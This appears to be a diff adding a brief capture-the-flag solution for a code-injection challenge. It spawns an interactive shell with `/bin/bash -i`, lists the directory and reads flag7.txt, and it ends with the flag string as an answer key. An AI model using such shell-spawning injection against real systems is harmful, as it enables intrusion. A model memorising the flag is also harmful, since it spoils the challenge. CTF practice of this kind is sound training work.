@@ -1,0 +1,18 @@
+CHALLENGE SOLUTION:
+-------------------
+
+1. Use `/bin/bash -i` to get a shell, although the shell is not very interactive.
+
+2. Doing the following will reveal diretory content:
+
+ls 
+exit
+
+Repeat step #1 and #2 but this time read the contents of flag7.txt
+
+`/bin/bash -i`
+cat flag7.txt
+exit
+
+
+FLAG: monkeyCTF{c0de_inj3cti0n_wa5_t00_3a5y}
